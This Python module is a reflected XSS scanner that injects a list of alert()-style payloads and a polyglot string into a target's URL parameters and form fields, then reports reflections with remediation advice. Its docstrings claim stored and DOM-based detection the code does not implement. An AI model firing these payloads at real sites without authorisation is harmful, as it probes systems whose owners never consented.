# modules/vuln_scanner/xss_scanner.py

"""
Cross-Site Scripting (XSS) Scanner
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Detects reflected, stored, and DOM-based XSS vulnerabilities
with context-aware payload injection.
"""

import re
from typing import Dict, List, Any, Optional
from urllib.parse import urlencode, urlparse, parse_qs, quote

import requests
from requests.exceptions import RequestException


class XSSScanner:
    """
    Cross-Site Scripting vulnerability scanner.
    
    Tests for reflected, stored, and DOM-based XSS
    using context-aware payload injection.
    """
    
    XSS_PAYLOADS = [
        '<script>alert("XSS")</script>',
        '"><script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<body onload=alert("XSS")>',
        '"><img src=x onerror=alert("XSS")>',
        "';alert('XSS');//",
        '"><svg/onload=alert("XSS")>',
        '<details open ontoggle=alert("XSS")>',
        '<marquee onstart=alert("XSS")>',
    ]
    
    POLYGLOT_PAYLOAD = "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the XSS scanner.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target.rstrip('/')
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 10)
        self.verify_ssl = self.config.get('verify_ssl', False)
        
        self.vulnerabilities: List[Dict[str, Any]] = []
        self.errors: List[str] = []
    
    def extract_parameters(self, url: str) -> Dict[str, str]:
        """
        Extract URL parameters for testing.
        
        Args:
            url: Target URL
            
        Returns:
            Dictionary of parameter names and values
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        param_dict = {}
        for key, values in params.items():
            param_dict[key] = values[0] if values else ''
        
        return param_dict
    
    def test_parameter(
        self,
        url: str,
        parameter: str,
        payload: str
    ) -> Optional[Dict[str, Any]]:
        """
        Test a single parameter for XSS.
        
        Args:
            url: Target URL
            parameter: Parameter name
            payload: XSS payload
            
        Returns:
            Dictionary with finding or None
        """
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = self.extract_parameters(url)
        params[parameter] = payload
        
        test_url = base_url + '?' + urlencode(params)
        
        try:
            response = self.session.get(
                test_url,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            
            if payload in response.text:
                context = self.detect_context(response.text, payload)
                
                return {
                    'url': test_url,
                    'parameter': parameter,
                    'payload': payload,
                    'context': context,
                    'type': 'reflected',
                    'status_code': response.status_code,
                }
            
            return None
            
        except RequestException:
            return None
    
    def detect_context(self, response_text: str, payload: str) -> str:
        """
        Detect the context where payload is reflected.
        
        Args:
            response_text: HTTP response text
            payload: Injected payload
            
        Returns:
            Context string
        """
        escaped_payload = re.escape(payload)
        
        if re.search(f'<script[^>]*>{escaped_payload}</script>', response_text, re.IGNORECASE):
            return 'script_tag'
        
        if re.search(f'(?:value|href|src)=["\']?{escaped_payload}', response_text, re.IGNORECASE):
            return 'html_attribute'
        
        if re.search(f'<!--.*?{escaped_payload}.*?-->', response_text, re.IGNORECASE):
            return 'html_comment'
        
        if re.search(f'>{escaped_payload}<', response_text, re.IGNORECASE):
            return 'html_body'
        
        return 'unknown'
    
    def test_forms(self, url: str) -> List[Dict[str, Any]]:
        """
        Test forms on page for XSS.
        
        Args:
            url: Target URL
            
        Returns:
            List of findings
        """
        findings = []
        
        try:
            response = self.session.get(url, timeout=self.timeout, verify=self.verify_ssl)
            
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                action = form.get('action', '')
                method = form.get('method', 'get').upper()
                form_url = url if not action else (
                    action if action.startswith('http') else url.rstrip('/') + '/' + action.lstrip('/')
                )
                
                inputs = form.find_all('input')
                
                for input_tag in inputs:
                    input_name = input_tag.get('name', '')
                    input_type = input_tag.get('type', 'text')
                    
                    if input_name and input_type not in ['submit', 'button', 'image', 'hidden']:
                        for payload in self.XSS_PAYLOADS[:3]:
                            result = self.test_parameter(form_url, input_name, payload)
                            
                            if result:
                                findings.append(result)
                                break
                            
            return findings
            
        except RequestException:
            return findings
    
    def run(self) -> Dict[str, Any]:
        """
        Run XSS scan.
        
        Returns:
            Dictionary with scan results
        """
        params = self.extract_parameters(self.target)
        
        for param_name in params:
            for payload in self.XSS_PAYLOADS[:5]:
                result = self.test_parameter(self.target, param_name, payload)
                
                if result:
                    self.vulnerabilities.append(result)
                    break
        
        form_findings = self.test_forms(self.target)
        self.vulnerabilities.extend(form_findings)
        
        findings = []
        
        for vuln in self.vulnerabilities:
            findings.append({
                'type': 'Cross-Site Scripting (XSS)',
                'severity': 'high',
                'endpoint': vuln['url'],
                'parameter': vuln['parameter'],
                'description': f"Reflected XSS via {vuln['parameter']} in {vuln['context']} context",
                'evidence': {
                    'payload': vuln['payload'],
                    'context': vuln['context'],
                },
                'remediation': 'Implement output encoding, Content-Security-Policy headers, and input validation',
            })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'vulnerabilities_found': len(findings),
        }